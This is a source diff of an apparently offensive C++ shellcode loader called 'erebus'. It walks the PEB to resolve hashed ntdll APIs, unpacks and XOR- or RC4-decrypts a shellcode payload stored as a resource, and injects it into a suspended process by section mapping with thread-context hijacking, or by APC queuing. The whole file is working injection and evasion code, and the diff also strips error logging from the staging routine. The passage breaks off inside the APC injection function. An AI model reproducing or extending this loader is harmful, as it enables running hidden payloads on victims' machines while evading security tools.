@@ -1,47 +1,65 @@
 #include "loader.hpp"
 
 namespace erebus {
+
 	Config config{};
 
-	//
-	// GetModuleHandle implementation with API hashing.
-	//
-	HMODULE GetModuleHandleC(_In_ ULONG dllHash)
-	{
-		// https://revers.engineering/custom-getprocaddress-and-getmodulehandle-implementation-x64/
-#if defined(_WIN64)
-#define ldr_offset 0x18
-#define list_offset 0x10
-#elif defined(_WIN32)
-#define ldr_offset 0x0C
-#define list_offset 0x0C
+	// ============================================================
+	// PEB/TEB / IMPORTS
+	// ============================================================
+	PTEB GetTEB(void) {
+#ifdef _WIN64
+		return (PTEB)__readgsqword(0x30);
+#else
+		return (PTEB)__readfsdword(0x18);
 #endif
+	}
 
-		PLIST_ENTRY head = (PLIST_ENTRY)&erebus::GetPEB()->Ldr->InMemoryOrderModuleList;
+	PPEB GetPEB(void) {
+#ifdef _WIN64
+		return (PPEB)__readgsqword(0x60);
+#else
+		return (PPEB)__readfsdword(0x30);
+#endif
+	}
+
+	PPEB GetPEBFromTEB(void) {
+		PTEB teb = GetTEB();
+		return (teb) ? teb->ProcessEnvironmentBlock : NULL;
+	}
+
+	HMODULE GetModuleHandleC(_In_ ULONG dllHash) {
+#if defined(_WIN64)
+		#define ldr_offset 0x18
+		#define list_offset 0x10
+#elif defined(_WIN32)
+		#define ldr_offset 0x0C
+		#define list_offset 0x0C
+#endif
+		PPEB pPeb = GetPEB();
+		if (!pPeb) pPeb = GetPEBFromTEB();
+		if (!pPeb || !pPeb->Ldr) return NULL;
+
+		PLIST_ENTRY head = (PLIST_ENTRY)&pPeb->Ldr->InMemoryOrderModuleList;
 		PLIST_ENTRY next = head->Flink;
+		if (!next) return NULL;
 
-		PLDR_MODULE module = (PLDR_MODULE)((PBYTE)next - list_offset);
-
-		while (next != head)
-		{
-			module = (PLDR_MODULE)((PBYTE)next - list_offset);
-			if (module->BaseDllName.Buffer != NULL)
-			{
+		while (next != head) {
+			PLDR_MODULE module = (PLDR_MODULE)((PBYTE)next - list_offset);
+			if (module->BaseDllName.Buffer != NULL && module->BaseDllName.Length > 0) {
 				if (dllHash - erebus::HashStringFowlerNollVoVariant1a(module->BaseDllName.Buffer) == 0)
 					return (HMODULE)module->BaseAddress;
 			}
 			next = next->Flink;
 		}
-
 		return NULL;
 	}
 
-	//
-	// GetProcAddress implementation with API hashing.
-	//
-	FARPROC GetProcAddressC(_In_ HMODULE dllBase, _In_ ULONG funcHash)
-	{
+	FARPROC GetProcAddressC(_In_ HMODULE dllBase, _In_ ULONG funcHash) {
+		if (!dllBase) return NULL;
 		PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(dllBase);
+		if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+
 #if _WIN64
 		PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((PBYTE)dos + (dos)->e_lfanew);
 #else
@@ -49,8 +67,7 @@ namespace erebus {
 #endif
 		PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dos + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
-		if (exports->AddressOfNames != 0)
-		{
+		if (exports->AddressOfNames != 0) {
 			PWORD ordinals = (PWORD)((UINT_PTR)dllBase + exports->AddressOfNameOrdinals);
 			PDWORD names = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfNames);
 			PDWORD functions = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfFunctions);
@@ -58,100 +75,108 @@ namespace erebus {
 			for (DWORD i = 0; i < exports->NumberOfNames; i++) {
 				LPCSTR name = (LPCSTR)((UINT_PTR)dllBase + names[i]);
 				if (HashStringFowlerNollVoVariant1a(name) == funcHash) {
-					PBYTE function = (PBYTE)((UINT_PTR)dllBase + functions[ordinals[i]]);
-					return (FARPROC)function;
+					return (FARPROC)((PBYTE)dllBase + functions[ordinals[i]]);
 				}
 			}
 		}
 		return NULL;
 	}
 
-	//
-	// LoadLibrary implementation.
-	//
-	HMODULE LoadLibraryC(_In_ PCWSTR dll_name)
-	{
-		HMODULE ntdll = 0;
-
+	HMODULE LoadLibraryC(_In_ PCWSTR dll_name) {
+		HMODULE ntdll = ImportModule("ntdll.dll");
+		if (!ntdll) return NULL;
+		ImportFunction(ntdll, RtlInitUnicodeString, typeRtlInitUnicodeString);
+		ImportFunction(ntdll, LdrLoadDll, typeLdrLoadDll);
+		if (!RtlInitUnicodeString || !LdrLoadDll) return NULL;
 		UNICODE_STRING unicode_module = { 0 };
 		HANDLE module_handle = INVALID_HANDLE_VALUE;
 		ULONG flags = 0;
-
-		ntdll = ImportModule("ntdll.dll");
-		if (!ntdll) return NULL;
-
-		ImportFunction(ntdll, RtlInitUnicodeString, typeRtlInitUnicodeString);
-		ImportFunction(ntdll, LdrLoadDll, typeLdrLoadDll);
-
 		RtlInitUnicodeString(&unicode_module, dll_name);
-
 		NTSTATUS status = LdrLoadDll(NULL, &flags, &unicode_module, &module_handle);
-		if (!NT_SUCCESS(status))
-		{
-			LOG_ERROR("LdrLoadDll failed with status: 0x%08lX", status);
-			return NULL;
-		}
-
+		if (!NT_SUCCESS(status)) return NULL;
 		return (HMODULE)module_handle;
-	}			  
-
-	//
-	// Cleanup Module After Use
-	//
-	VOID CleanupModule(_In_ HMODULE module_handle)
-	{
-		if (!module_handle)
-		{
-			LOG_ERROR("Module not found.");
-			return;
-		}
-
-		return;
 	}
+
+	VOID RtlFreeHeapC(_In_ HANDLE HeapHandle, _In_ ULONG Flags, _In_ PVOID HeapBase) {
+		HMODULE ntdll = ImportModule("ntdll.dll");
+		if (!ntdll) return;
+		ImportFunction(ntdll, RtlFreeHeap, typeRtlFreeHeap);
+		if (!RtlFreeHeap) return;
+		RtlFreeHeap(HeapHandle, Flags, HeapBase);
+	}
+	
+
+	VOID CleanupModule(_In_ HMODULE module_handle) { return; }
+
+	// ============================================================
+	// DECOMPRESSION & DECODING ROUTINES
+	// ============================================================
 
 	VOID DecompressionLZNT(_Inout_ BYTE** Input, _Inout_ SIZE_T* InputLen)
 	{
-		SIZE_T OutputLen = (*InputLen) * 2;
-		BYTE* Output = new BYTE[OutputLen];
-		ULONG FinalOutputSize;
-
 		HMODULE ntdll = ImportModule("ntdll.dll");
+		if (!ntdll) return;
+		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
+		ImportFunction(ntdll, RtlFreeHeap, typeRtlFreeHeap);
 		ImportFunction(ntdll, RtlDecompressBuffer, typeRtlDecompressBuffer);
+		if (!RtlDecompressBuffer || !RtlFreeHeap || !RtlAllocateHeap) return;
 
-		NTSTATUS status = RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, Output, OutputLen, *Input, *InputLen, &FinalOutputSize);
+		SIZE_T OutputLen = (*InputLen) * 4;
+		BYTE* Output = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, OutputLen);
+		if (!Output) return;
 
-		if (!NT_SUCCESS(status))
+		ULONG FinalOutputSize;
+		if (NT_SUCCESS(RtlDecompressBuffer(0x0002, Output, (ULONG)OutputLen, *Input, (ULONG)*InputLen, &FinalOutputSize))) {
+			// Only free if it was heap allocated (Main ensures this by copying first)
+			RtlFreeHeap(RtlProcessHeap(), 0, *Input);
+			*Input = Output;
+			*InputLen = FinalOutputSize;
+		} else {
+			RtlFreeHeap(RtlProcessHeap(), 0, Output);
+		}
+	}
+
+	VOID DecompressionRLE(_Inout_ BYTE** Input, _Inout_ SIZE_T* InputLen)
+	{
+		HMODULE ntdll = ImportModule("ntdll.dll");
+		if (!ntdll) return;
+		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
+		ImportFunction(ntdll, RtlFreeHeap, typeRtlFreeHeap);
+
+		if (!Input || !*Input || !InputLen || *InputLen == 0)
 		{
-			LOG_ERROR("RtlDecompressBuffer failed 0x%08X", status);
-			delete[] Output;
+			LOG_ERROR("Invalid input buffer for RLE decompression");
 			return;
 		}
 
-		RtlCopyMemory(*Input, Output, FinalOutputSize);
-		*InputLen = FinalOutputSize;
-		delete[] Output;
-		return;
-	}
+		SIZE_T OutputCapacity = (*InputLen) * 4;
+		if (OutputCapacity < *InputLen)
+		{
+			LOG_ERROR("Output length overflow in RLE decompression");
+			return;
+		}
 
-	VOID DecompressionRLE(_Inout_ BYTE* Input, IN SIZE_T InputLen, OUT SIZE_T* OutputLen)
-	{
-		SIZE_T OutputCapacity = InputLen * 4;
-		BYTE* Output = new BYTE[OutputCapacity];
+		BYTE* Output = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, OutputCapacity);
+		if (!Output)
+		{
+			LOG_ERROR("Failed to allocate RLE output buffer");
+			return;
+		}
 		SIZE_T OutputIndex = 0;
 
-		for (SIZE_T i = 0; i < InputLen && OutputIndex < OutputCapacity; i++)
+		for (SIZE_T i = 0; i < *InputLen && OutputIndex < OutputCapacity; i++)
 		{
-			BYTE byte = Input[i];
+			BYTE byte = (*Input)[i];
 
 			// Check if this is a run byte (0xFF indicates a run)
-			if (byte == 0xFF && i + 1 < InputLen)
+			if (byte == 0xFF && i + 1 < *InputLen)
 			{
 				i++;
-				BYTE count = Input[i];
-				if (i + 1 < InputLen)
+				BYTE count = (*Input)[i];
+				if (i + 1 < *InputLen)
 				{
 					i++;
-					BYTE value = Input[i];
+					BYTE value = (*Input)[i];
 					for (int j = 0; j < count && OutputIndex < OutputCapacity; j++)
 					{
 						Output[OutputIndex++] = value;
@@ -164,17 +189,37 @@ namespace erebus {
 			}
 		}
 
-		RtlCopyMemory(Input, Output, OutputIndex);
-		*OutputLen = OutputIndex;
-		delete[] Output;
+		BYTE* OldInput = *Input;
+		*Input = Output;
+		*InputLen = OutputIndex;
+		RtlFreeHeap(RtlProcessHeap(), 0, OldInput);
 		return;
 	}
 
-	VOID DecryptionXOR(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen)
+	// Calculate entropy using integer-based heuristic (CRT-less alternative)
+	// Returns approximate entropy score without floating point math
+	// Score: 0-100+ where high scores indicate encryption/compression
+	DWORD CalculateEntropyInteger(_In_ const BYTE* Data, IN SIZE_T DataLen)
 	{
-		for (SIZE_T i = 0; i < InputLen; i++)
-			Input[i] ^= Key[i % KeyLen];
-		return;
+		if (!Data || DataLen == 0) return 0;
+
+		DWORD frequency[256] = { 0 };
+		for (SIZE_T i = 0; i < DataLen; i++)
+			frequency[Data[i]]++;
+
+		// Count how many byte values appear
+		DWORD uniqueBytes = 0;
+		for (int i = 0; i < 256; i++)
+		{
+			if (frequency[i] > 0)
+				uniqueBytes++;
+		}
+
+		// Simple entropy approximation:
+		// - Uniform distribution (all 256 bytes appear) = high entropy (encrypted/compressed)
+		// - Low diversity = low entropy (plaintext)
+		// Score: (uniqueBytes / 256) * 100
+		return (uniqueBytes * 100) / 256;
 	}
 
 	BYTE DecodeBASE64Char(CHAR c)
@@ -317,166 +362,55 @@ namespace erebus {
 		return TRUE;
 	}
 
+	// ===========================================================
+	// DECRYPTION ROUTINE
+	// ===========================================================
+
+	// XOR Decryption
+	VOID DecryptionXor(unsigned char* data, size_t len, unsigned char* key, size_t key_len)
+	{
+		if (key_len == 0) return;
+		for (size_t i = 0; i < len; i++) {
+			data[i] ^= key[i % key_len];
+		}
+	}
+
+	// RC4 Decryption
+	VOID DecryptionRc4(unsigned char* data, size_t len, unsigned char* key, size_t key_len)
+	{
+		unsigned char S[256];
+		unsigned char temp;
+		int i, j = 0;
+		
+		for (i = 0; i < 256; i++) S[i] = i;
+		
+		for (i = 0; i < 256; i++) {
+			j = (j + S[i] + key[i % key_len]) % 256;
+			temp = S[i];
+			S[i] = S[j];
+			S[j] = temp;
+		}
+		
+		i = 0; j = 0;
+		for (size_t k = 0; k < len; k++) {
+			i = (i + 1) % 256;
+			j = (j + S[i]) % 256;
+			temp = S[i];
+			S[i] = S[j];
+			S[j] = temp;
+			data[k] ^= S[(S[i] + S[j]) % 256];
+		}
+	}
+
 	// ============================================================
-	// AUTO-DETECTION METHODS
+	// AUTO-DETECTION LOGIC
 	// ============================================================
-
-	enum CompressionFormat {
-		FORMAT_NONE = 0,
-		FORMAT_LZNT1 = 1,
-		FORMAT_RLE = 2,
-		FORMAT_BASE64 = 3,
-		FORMAT_ASCII85 = 4,
-		FORMAT_ALPHA32 = 5,
-		FORMAT_WORDS256 = 6
-	};
-
-	CompressionFormat DetectCompressionFormat(_In_ const BYTE* Input, IN SIZE_T InputLen)
-	{
-		if (!Input || InputLen < 2)
-			return FORMAT_NONE;
-
-		// Check for LZNT1 compression signature
-		if (InputLen >= 4 && (Input[0] & 0x80) != 0)
-		{
-			LOG_INFO("Detected LZNT1 compression");
-			return FORMAT_LZNT1;
-		}
-
-		// Check for RLE (Run-Length Encoding) - look for 0xFF markers
-		if (InputLen >= 3)
-		{
-			int RleMarkerCount = 0;
-			for (SIZE_T i = 0; i < min(InputLen - 2, 100); i++)
-			{
-				if (Input[i] == 0xFF && i + 2 < InputLen)
-				{
-					RleMarkerCount++;
-				}
-			}
-			if (RleMarkerCount > 0)
-			{
-				LOG_INFO("Detected RLE compression (%d markers found)", RleMarkerCount);
-				return FORMAT_RLE;
-			}
-		}
-
-		LOG_INFO("No compression detected");
-		return FORMAT_NONE;
-	}
-
-	BOOL IsValidBase64Char(CHAR c)
-	{
-		return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || 
-		       (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=' ||
-		       c == ' ' || c == '\t' || c == '\n' || c == '\r';
-	}
-
-	BOOL IsValidASCII85Char(CHAR c)
-	{
-		return (c >= 33 && c <= 117) || c == '!' || c == ' ' || c == '\t' || c == '\n' || c == '\r';
-	}
-
-	BOOL IsValidALPHA32Char(CHAR c)
-	{
-		const CHAR Alpha32Alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";
-		return strchr(Alpha32Alphabet, c) != NULL;
-	}
-
-	BOOL IsValidWORDS256Format(_In_ const CHAR* Input, IN SIZE_T InputLen)
-	{
-		// Check if input is space-separated numbers 0-255
-		SIZE_T i = 0;
-		int WordCount = 0;
-
-		while (i < InputLen && WordCount < 100)
-		{
-			// Skip delimiters
-			while (i < InputLen && (Input[i] == ' ' || Input[i] == '\t' || Input[i] == '\n' || Input[i] == '\r'))
-				i++;
-
-			if (i >= InputLen) break;
-
-			// Check if word contains only digits
-			SIZE_T WordStart = i;
-			while (i < InputLen && Input[i] >= '0' && Input[i] <= '9')
-				i++;
-
-			SIZE_T WordLen = i - WordStart;
-			if (WordLen == 0 || WordLen > 3)
-				return FALSE;
-
-			WordCount++;
-		}
-
-		return WordCount > 0;
-	}
-
-	CompressionFormat DetectEncodingFormat(_In_ const CHAR* Input, IN SIZE_T InputLen)
-	{
-		if (!Input || InputLen < 4)
-			return FORMAT_NONE;
-
-		// Check for Base64
-		int Base64ValidCount = 0;
-		for (SIZE_T i = 0; i < InputLen; i++)
-		{
-			if (IsValidBase64Char(Input[i]))
-				Base64ValidCount++;
-		}
-		if (Base64ValidCount > (InputLen * 0.9))
-		{
-			LOG_INFO("Detected Base64 encoding");
-			return FORMAT_BASE64;
-		}
-
-		// Check for ASCII85
-		int ASCII85ValidCount = 0;
-		for (SIZE_T i = 0; i < InputLen; i++)
-		{
-			if (IsValidASCII85Char(Input[i]))
-				ASCII85ValidCount++;
-		}
-		if (ASCII85ValidCount > (InputLen * 0.8))
-		{
-			LOG_INFO("Detected ASCII85 encoding");
-			return FORMAT_ASCII85;
-		}
-
-		// Check for ALPHA32
-		BOOL IsAlpha32 = TRUE;
-		for (SIZE_T i = 0; i < InputLen; i++)
-		{
-			if (!IsValidALPHA32Char(Input[i]))
-			{
-				IsAlpha32 = FALSE;
-				break;
-			}
-		}
-		if (IsAlpha32)
-		{
-			LOG_INFO("Detected ALPHA32 encoding");
-			return FORMAT_ALPHA32;
-		}
-
-		// Check for WORDS256
-		if (IsValidWORDS256Format(Input, InputLen))
-		{
-			LOG_INFO("Detected WORDS256 encoding");
-			return FORMAT_WORDS256;
-		}
-
-		LOG_INFO("No encoding detected");
-		return FORMAT_NONE;
-	}
 
 	VOID AutoDetectAndDecode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen)
 	{
-		LOG_INFO("Analyzing shellcode format...");
+		LOG_INFO("Decompressing shellcode...");
 
-		CompressionFormat format = DetectCompressionFormat(*Shellcode, *ShellcodeLen);
-		
-		switch (format)
+		switch (CONFIG_COMPRESSION_TYPE)
 		{
 			case FORMAT_LZNT1:
 			{
@@ -487,265 +421,261 @@ namespace erebus {
 			case FORMAT_RLE:
 			{
 				LOG_SUCCESS("Decompressing with RLE");
-				SIZE_T NewLen = 0;
-				DecompressionRLE(*Shellcode, *ShellcodeLen, &NewLen);
-				*ShellcodeLen = NewLen;
+				DecompressionRLE(Shellcode, ShellcodeLen);
 				break;
 			}
 			default:
-				LOG_INFO("No binary compression detected, skipping decompression");
+				LOG_INFO("No compression configured (CONFIG_COMPRESSION_TYPE = 0), skipping decompression");
 				break;
 		}
 	}
 
 	VOID AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
-		LOG_INFO("Analyzing encoding format...");
+		LOG_INFO("Decoding shellcode...");
 
-		CompressionFormat format = DetectEncodingFormat(Input, InputLen);
-
-		switch (format)
+		switch (CONFIG_ENCODING_TYPE)
 		{
-			case FORMAT_BASE64:
-			{
-				LOG_SUCCESS("Decoding Base64");
-				DecodeBase64(Input, InputLen, Output, OutputLen);
-				break;
-			}
-			case FORMAT_ASCII85:
-			{
-				LOG_SUCCESS("Decoding ASCII85");
-				DecodeASCII85(Input, InputLen, Output, OutputLen);
-				break;
-			}
-			case FORMAT_ALPHA32:
-			{
-				LOG_SUCCESS("Decoding ALPHA32");
-				DecodeALPHA32(Input, InputLen, Output, OutputLen);
-				break;
-			}
-			case FORMAT_WORDS256:
-			{
-				LOG_SUCCESS("Decoding WORDS256");
-				DecodeWORDS256(Input, InputLen, Output, OutputLen);
-				break;
-			}
-			default:
-			{
-				LOG_INFO("No encoding detected, returning raw input");
-				*Output = new BYTE[InputLen];
-				RtlCopyMemory(*Output, Input, InputLen);
-				*OutputLen = InputLen;
-				break;
-			}
+		case FORMAT_BASE64:
+		{
+			LOG_SUCCESS("Decoding Base64");
+			DecodeBase64(Input, InputLen, Output, OutputLen);
+			break;
+		}
+		case FORMAT_ASCII85:
+		{
+			LOG_SUCCESS("Decoding ASCII85");
+			DecodeASCII85(Input, InputLen, Output, OutputLen);
+			break;
+		}
+		case FORMAT_ALPHA32:
+		{
+			LOG_SUCCESS("Decoding ALPHA32");
+			DecodeALPHA32(Input, InputLen, Output, OutputLen);
+			break;
+		}
+		case FORMAT_WORDS256:
+		{
+			LOG_SUCCESS("Decoding WORDS256");
+			DecodeWORDS256(Input, InputLen, Output, OutputLen);
+			break;
+		}
+		default:
+		{
+			LOG_INFO("No encoding configured (CONFIG_ENCODING_TYPE = 0), returning raw input");
+			*Output = new BYTE[InputLen];
+			RtlCopyMemory(*Output, Input, InputLen);
+			*OutputLen = InputLen;
+			break;
+		}
 		}
 	}
 
+	// ============================================================
+	// DECOMPRESSION ROUTINE
+	// ============================================================
+	
+	VOID DecompressShellcode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen)
+	{
+		LOG_INFO("========================================");
+		LOG_INFO("Shellcode Decompression (CONFIG-based)");
+		LOG_INFO("========================================");
+
+		switch (CONFIG_COMPRESSION_TYPE)
+		{
+		case FORMAT_LZNT1:
+		{
+			LOG_SUCCESS("Decompressing with LZNT1");
+			DecompressionLZNT(Shellcode, ShellcodeLen);
+			LOG_SUCCESS("Decompression complete: %zu bytes", *ShellcodeLen);
+			break;
+		}
+		case FORMAT_RLE:
+		{
+			LOG_SUCCESS("Decompressing with RLE");
+			DecompressionRLE(Shellcode, ShellcodeLen);
+			LOG_SUCCESS("Decompression complete: %zu bytes", *ShellcodeLen);
+			break;
+		}
+		default:
+			LOG_INFO("No compression configured (CONFIG_COMPRESSION_TYPE = 0)");
+			break;
+		}
+
+		// Final validation
+		LOG_INFO("========================================");
+		LOG_INFO("Decompression complete");
+		LOG_INFO("Final size: %zu bytes", *ShellcodeLen);
+
+		DWORD finalEntropyScore = CalculateEntropyInteger(*Shellcode, *ShellcodeLen);
+		LOG_INFO("Final entropy score: %lu/100", finalEntropyScore);
+
+		if (*ShellcodeLen > 0 && (*Shellcode)[0] != 0x00)
+		{
+			LOG_SUCCESS("Shellcode appears valid (non-null start)");
+		}
+		else
+		{
+			LOG_ERROR("Shellcode may be invalid or corrupted");
+		}
+
+		LOG_INFO("========================================");
+	}
+
+	// ============================================================
+	// RESOURCE STAGING
+	// ============================================================
 	BOOL StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PBYTE* shellcode, OUT SIZE_T* shellcode_size)
 	{
 		BOOL success = FALSE;
-		PVOID shellcode_address;
-
 		HRSRC resource_handle = FindResourceW(nullptr, MAKEINTRESOURCEW(resource_id), resource_class);
-		if (!resource_handle)
-		{
-			LOG_ERROR("Failed to get resource handle. (Code: 0x%08lX)", GetLastError());
+		if (!resource_handle) {
+			// LOG_ERROR("Failed to get resource handle.");
 			return success;
 		}
 
 		DWORD resource_size = SizeofResource(nullptr, resource_handle);
-
 		HGLOBAL global_handle = LoadResource(nullptr, resource_handle);
-		if (!global_handle)
-		{
-			LOG_ERROR("Failed to get global handle. (Code: 0x%08lX)", GetLastError());
+		if (!global_handle) {
+			// LOG_ERROR("Failed to get global handle.");
 			return success;
 		}
 
 		PVOID resource_pointer = LockResource(global_handle);
-		if (!resource_pointer)
-		{
-			LOG_ERROR("Failed to get resource pointer. (Code: 0x%08lX)", GetLastError());
+		if (!resource_pointer) {
+			// LOG_ERROR("Failed to get resource pointer.");
 			return success;
 		}
 
-		shellcode_address = HeapAlloc(GetProcessHeap(), 0, resource_size);
-		if (shellcode_address)
-		{
-			RtlCopyMemory(shellcode_address, resource_pointer, resource_size);
+		// Allocate new buffer on heap so it's writable (important for decryption!)
+		*shellcode = (PBYTE)HeapAlloc(GetProcessHeap(), 0, resource_size);
+		if (*shellcode) {
+			RtlCopyMemory(*shellcode, resource_pointer, resource_size);
+			*shellcode_size = (SIZE_T)resource_size;
 			success = TRUE;
 		}
 
-		*shellcode_size = (SIZE_T)resource_size;
-		*shellcode = (BYTE*)shellcode_address;
 		return success;
 	}
 
+	// ============================================================
+	// MEMORY WRITER
+	// ============================================================
 	PVOID WriteShellcodeInMemory(IN HANDLE process_handle, IN BYTE* shellcode, IN SIZE_T shellcode_size)
 	{
+		BYTE* pFinalShellcode = shellcode;
+		SIZE_T sFinalSize = shellcode_size;
+
+		// 1. Decompress/Decode
+		erebus::AutoDetectAndDecode(&pFinalShellcode, &sFinalSize);
+
 		SIZE_T bytes_written = 0;
 		PVOID base_address = NULL;
-		HMODULE ntdll = NULL;
-		DWORD old_protection = 0;
+		SIZE_T allocation_size = sFinalSize;
+		HMODULE ntdll = ImportModule("ntdll.dll");
+		if (!ntdll) return NULL;
 
-		ntdll = ImportModule("ntdll.dll");
 		ImportFunction(ntdll, NtAllocateVirtualMemory, typeNtAllocateVirtualMemory);
 		ImportFunction(ntdll, NtWriteVirtualMemory, typeNtWriteVirtualMemory);
 		ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);
 
-		if (!NT_SUCCESS(NtAllocateVirtualMemory(process_handle, &base_address, 0, &shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)))
-		{
-			LOG_ERROR("Failed to allocate memory space.");
-			return NULL;
-		}
-		else LOG_SUCCESS("Address Pointer: 0x%08pX", base_address);
+		if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory) return NULL;
 
-		if (!NT_SUCCESS(NtWriteVirtualMemory(process_handle, base_address, shellcode, shellcode_size, &bytes_written)))
-		{
-			LOG_ERROR("Error writing shellcode to memory.");
-			return NULL;
+		if (NT_SUCCESS(NtAllocateVirtualMemory(process_handle, &base_address, 0, &allocation_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE))) {
+			if (NT_SUCCESS(NtWriteVirtualMemory(process_handle, base_address, (PVOID)pFinalShellcode, sFinalSize, &bytes_written))) {
+				DWORD old;
+				NtProtectVirtualMemory(process_handle, &base_address, &allocation_size, PAGE_EXECUTE_READ, &old);
+				return base_address;
+			}
 		}
-		else LOG_SUCCESS("Shellcode written to memory.");
-
-		if (!NT_SUCCESS(NtProtectVirtualMemory(process_handle, &base_address, &shellcode_size, PAGE_EXECUTE_READ, &old_protection)))
-		{
-			LOG_ERROR("Failed to change protection type.");
-			return NULL;
-		}
-		else LOG_SUCCESS("Protection changed to RX.");
-
-		return base_address;
+		return NULL;
 	}
 
 	BOOL CreateProcessSuspended(IN wchar_t cmd[], OUT HANDLE* process_handle, OUT HANDLE* thread_handle)
 	{
-		SIZE_T lpSize = 0;
-		const DWORD attribute_count = 1;
-
 		STARTUPINFOW startup_info = {};
 		PROCESS_INFORMATION process_info = {};
-
-		BOOL success = CreateProcessW(
-			NULL,
-			cmd,
-			NULL,
-			NULL,
-			FALSE,
-			(CREATE_NO_WINDOW | CREATE_SUSPENDED),
-			NULL,
-			NULL,
-			&startup_info,
-			&process_info);
-
+		BOOL success = CreateProcessW(NULL, cmd, NULL, NULL, FALSE, (CREATE_NO_WINDOW | CREATE_SUSPENDED), NULL, NULL, &startup_info, &process_info);
 		*process_handle = process_info.hProcess;
 		*thread_handle = process_info.hThread;
-
 		return success;
 	}
 
+	// ============================================================
+	// INJECTION METHODS
+	// ============================================================
+
 	VOID InjectionNtMapViewOfSection(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle)
 	{
-		LOG_INFO("Injection via. NtUnmapViewOfSection");
+		BYTE* pFinalShellcode = shellcode;
+		SIZE_T sFinalSize = shellcode_size;
+
+		erebus::AutoDetectAndDecode(&pFinalShellcode, &sFinalSize);
 
 		HANDLE section_handle;
-		LARGE_INTEGER section_size = { shellcode_size };
+		LARGE_INTEGER section_size = { 0 };
+		section_size.QuadPart = sFinalSize;
 
 		HMODULE ntdll = ImportModule("ntdll.dll");
+		if (!ntdll) return;
+
 		ImportFunction(ntdll, NtCreateSection, typeNtCreateSection);
 		ImportFunction(ntdll, NtMapViewOfSection, typeNtMapViewOfSection);
 		ImportFunction(ntdll, NtUnmapViewOfSection, typeNtUnmapViewOfSection);
+		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
 		ImportFunction(ntdll, NtClose, typeNtClose);
 
+		if (!NtCreateSection || !NtMapViewOfSection || !NtClose || !NtUnmapViewOfSection || !NtResumeThread) return;
 
-		NTSTATUS status = NtCreateSection(
-			&section_handle,
-			SECTION_ALL_ACCESS,
-			NULL,
-			&section_size,
-			PAGE_EXECUTE_READWRITE,
-			SEC_COMMIT,
-			NULL
-		);
-
-		PVOID local_address = NULL;
-
-		status = NtMapViewOfSection(
-			section_handle,
-			process_handle,
-			&local_address,
-			NULL,
-			NULL,
-			NULL,
-			&shellcode_size,
-			(SECTION_INHERIT)ViewShare,
-			NULL,
-			PAGE_EXECUTE_READ
-		);
-
-		RtlCopyMemory(local_address, shellcode, shellcode_size);
-
-		PVOID remote_address = NULL;
-
-		status = NtMapViewOfSection(
-			section_handle,
-			process_handle,
-			&remote_address,
-			NULL,
-			NULL,
-			NULL,
-			&shellcode_size,
-			(SECTION_INHERIT)ViewShare,
-			NULL,
-			PAGE_EXECUTE_READ);
-
-		LPCONTEXT context_ptr = new CONTEXT();
-		context_ptr->ContextFlags = CONTEXT_INTEGER;
-		GetThreadContext(thread_handle, context_ptr);
-
-		context_ptr->Rcx = (DWORD64)remote_address;
-		SetThreadContext(thread_handle, context_ptr);
-
-		ResumeThread(thread_handle);
-
-		status = NtUnmapViewOfSection(
-			process_handle,
-			local_address
-		);
-
+		if (NT_SUCCESS(NtCreateSection(&section_handle, SECTION_ALL_ACCESS, NULL, &section_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL))) {
+			PVOID local_addr = NULL;
+			SIZE_T view_size = sFinalSize;
+			if (NT_SUCCESS(NtMapViewOfSection(section_handle, NtCurrentProcess(), &local_addr, 0, 0, 0, &view_size, ViewShare, 0, PAGE_READWRITE))) {
+				RtlCopyMemory(local_addr, pFinalShellcode, sFinalSize);
+				
+				PVOID remote_addr = NULL;
+				if (NT_SUCCESS(NtMapViewOfSection(section_handle, process_handle, &remote_addr, 0, 0, 0, &view_size, ViewShare, 0, PAGE_EXECUTE_READ))) {
+					LPCONTEXT ctx = new CONTEXT();
+					ctx->ContextFlags = CONTEXT_FULL;
+					if (GetThreadContext(thread_handle, ctx)) {
+#ifdef _WIN64
+						ctx->Rip = (DWORD64)remote_addr;
+#else
+						ctx->Eip = (DWORD)remote_addr;
+#endif
+						SetThreadContext(thread_handle, ctx);
+						NtResumeThread(thread_handle, NULL);
+					}
+					delete ctx;
+				}
+				NtUnmapViewOfSection(NtCurrentProcess(), local_addr);
+			}
+			NtClose(section_handle);
+		}
 		NtClose(process_handle);
 		NtClose(thread_handle);
-
-		LOG_SUCCESS("Injection Complete!");
-
-		return;
 	}
 
 	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
 	{
-		LOG_INFO("Injection via. NtQueueApcThread");
+		// WriteShellcodeInMemory calls AutoDetect internally now
